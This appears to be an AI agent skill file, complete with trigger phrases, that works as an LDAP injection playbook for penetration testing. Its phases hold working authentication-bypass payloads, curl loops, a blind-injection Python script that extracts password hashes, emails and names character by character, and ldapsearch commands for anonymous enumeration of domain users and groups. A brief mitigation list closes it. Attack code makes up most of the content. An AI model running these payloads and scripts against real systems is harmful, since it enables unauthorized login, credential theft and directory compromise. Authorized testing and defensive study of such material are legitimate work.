---
name: payload-ldap-injection
description: "LDAP injection payloads and testing. Filter breakout, authentication bypass, blind enumeration, attribute extraction. Triggers: 'ldap injection', 'ldap filter bypass', 'ldap auth bypass', 'ldap attack', 'ldap enumeration', 'active directory injection', 'openldap injection'."
---

# LDAP Injection

Exploit unsanitized input in LDAP filters to bypass authentication, enumerate users, or extract data.

## Install

```bash
apt-get install -y ldap-utils jq
```

---

## Phase 1: Identify Vulnerable LDAP Filter Patterns

```bash
# Common vulnerable patterns (server-side):
# (uid={input})
# (|(uid={input})(mail={input}))
# (&(objectClass=person)(uid={input}))
# (member={input})
# (&(cn={input})(userPassword={input}))

# Detection: inject * and observe response
TARGET_URL="https://TARGET/login"
curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=*&password=test" | diff - <(curl -s -X POST "$TARGET_URL" -d "username=invalid&password=test")

# If different response → * is interpolated into LDAP filter → injectable
```

---

## Phase 2: Authentication Bypass

```bash
TARGET_URL="https://TARGET/login"

# Classic bypass payloads:
PAYLOADS=(
  "*"
  "*)(&"
  "*)(|(uid=*"
  "admin*"
  "*)(|(cn=*))%00"
  "*)(objectClass=*"
  ")(|(cn=admin"
)

for p in "${PAYLOADS[@]}"; do
  echo "=== Testing: $p ==="
  curl -s -X POST "$TARGET_URL" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=$p&password=anything" | grep -iE "welcome|dashboard|success|admin|logout"
done

# URL-encoded variants:
curl -s -X POST "$TARGET_URL" \
  -d "username=%2a&password=test"              # * encoded
curl -s -X POST "$TARGET_URL" \
  -d "username=%2a%29%28%7c%28uid%3d%2a%29%29&password=test"  # *)(|(uid=*)

# RFC4515 escaped variants:
curl -s -X POST "$TARGET_URL" \
  -d "username=\2a&password=test"              # \2a = * in LDAP escape
curl -s -X POST "$TARGET_URL" \
  -d "username=\29\28\7c\28uid\3d\2a\29\29&password=test"
```

---

## Phase 3: Attribute Enumeration (Blind)

```bash
# Blind LDAP injection — character-by-character extraction
TARGET_URL="https://TARGET/login"

# Test if filter syntax works (true = shorter/different response):
BASELINE_LEN=$(curl -s -X POST "$TARGET_URL" -d "username=invalid&password=x" -w '%{size_download}' -o /dev/null)
INJECT_LEN=$(curl -s -X POST "$TARGET_URL" -d "username=*&password=x" -w '%{size_download}' -o /dev/null)

echo "Baseline: $BASELINE_LEN, Injected: $INJECT_LEN"
# Different size = injection confirmed

# Enumerate using boolean-based differential:
ldap_test() {
  payload="$1"
  len=$(curl -s -X POST "$TARGET_URL" \
    -d "username=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")&password=x" \
    -w '%{size_download}' -o /dev/null)
  echo "$len"
}

# Test attribute existence:
ldap_test "admin)(userPassword=*"     # Does admin have userPassword?
ldap_test "admin)(mail=*"             # Does admin have mail?
ldap_test "*)(|(uid=admin"            # Is admin a valid UID?
```

---

## Phase 4: Blind Data Extraction (Character by Character)

```python
#!/usr/bin/env python3
import requests
import string

TARGET = "https://TARGET/login"

def oracle(payload):
    """Returns True if LDAP query returned valid result."""
    r = requests.post(TARGET, data={"username": payload, "password": "x"})
    return "welcome" in r.text.lower() or "dashboard" in r.text.lower()

def extract_attribute(attr_name, max_len=50):
    """Extract attribute value via blind LDAP injection."""
    value = ""
    for pos in range(max_len):
        found = False
        for ch in string.printable:
            if ch in "*()\\":
                continue
            # Filter: (&(uid=TARGET_USER)(ATTR_NAME=VALUE*))
            payload = f"admin)({attr_name}={value}{ch}*"
            if oracle(payload):
                value += ch
                print(f"  [+] Found char at {pos}: {ch} → {value}")
                found = True
                break
        if not found:
            break
    return value

# Extract values:
print("Extracting password hash...")
passwd = extract_attribute("userPassword")
print(f"Password: {passwd}")

print("\nExtracting email...")
email = extract_attribute("mail")
print(f"Email: {email}")

print("\nExtracting CN...")
cn = extract_attribute("cn")
print(f"CN: {cn}")
```

---

## Phase 5: LDAP Null Bind / Anonymous Enumeration

```bash
DC_IP="10.10.10.1"
BASE_DN="DC=domain,DC=com"

# Anonymous bind (no credentials):
ldapsearch -x -H ldap://$DC_IP -b "$BASE_DN" "(objectClass=*)" | head -50

# Null bind:
ldapsearch -x -H ldap://$DC_IP -b "$BASE_DN" -D "" -w "" "(objectClass=user)" sAMAccountName

# If anonymous works — enumerate users:
ldapsearch -x -H ldap://$DC_IP -b "$BASE_DN" \
  "(objectClass=user)" sAMAccountName mail description | grep -E "^sAMAccountName:|^mail:|^description:"

# Enumerate groups:
ldapsearch -x -H ldap://$DC_IP -b "$BASE_DN" \
  "(objectClass=group)" cn member | grep -E "^cn:|^member:"

# Find password policy:
ldapsearch -x -H ldap://$DC_IP -b "$BASE_DN" \
  "(objectClass=domain)" minPwdLength lockoutThreshold pwdHistoryLength
```

---

## Phase 6: Remediation Reference

```
Mitigation:
1. Use parameterized LDAP queries (safe filter builders)
2. Escape special characters: * ( ) \ NUL /
   - * → \2a
   - ( → \28
   - ) → \29
   - \ → \5c
   - NUL → \00
3. Allowlist valid usernames (alphanumeric + hyphen only)
4. Implement account lockout
5. Run LDAP service with minimal permissions
6. Disable anonymous/null bind
```

---

## Output

Save to `.omop/engagement/vuln/ldap-injection/`:
- `auth-bypass.txt` — successful bypass payloads
- `extracted-data.txt` — blindly extracted attribute values
- `anonymous-enum.txt` — data accessible without credentials

## Next Phase

→ `ad-attacks` for full Active Directory compromise
→ `pentest-report` for final report
